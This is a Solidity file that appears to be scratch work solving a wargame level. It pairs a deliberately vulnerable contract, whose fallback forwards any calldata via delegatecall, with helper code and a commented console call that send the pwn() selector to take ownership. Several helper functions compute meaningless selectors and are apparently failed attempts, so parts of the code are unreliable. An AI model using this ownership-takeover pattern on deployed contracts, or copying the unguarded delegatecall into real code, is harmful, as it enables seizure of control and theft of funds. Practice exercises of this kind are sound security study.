//await contract.sendTransaction({data:"0xdd365b8b"})

pragma solidity ^0.4.18;

pragma solidity ^0.4.18;

contract Delegate {

  address public owner;

  function Delegate(address _owner) public {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;
  bytes public storageData;

  function Delegation(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  function() public {
    if(delegate.delegatecall(msg.data)) {
      this;
      storageData = msg.data;
    }
  }

}

contract DelegateHelper {

    Delegate delegate;

    function callFallbackByte4(address _contract, bytes4 _input) public returns (bool) {
        return address(_contract).call(bytes4(keccak256("delegate.delegatecall(bytes4)")), _input);
    }

    function tryDelegate(address _contract) public {
        delegate = Delegate(_contract);
        delegate.delegatecall(bytes4(keccak256("pwn()")));
    }

    function tryFallback(address _contract) public {
        address(_contract).call(bytes4(keccak256("delegate.delegatecall()")));
    }

    function tryFallback2(address _contract) public {
        bytes4 data = 0xdd365b8b;
        address(_contract).call(data);
    }

    function getSig() public pure returns (bytes4) {
        return bytes4(keccak256("delegate.delegatecall()"));
    }

    function getMsgSig() public pure returns (bytes4) {
        return bytes4(keccak256("pwn()"));
    }

}
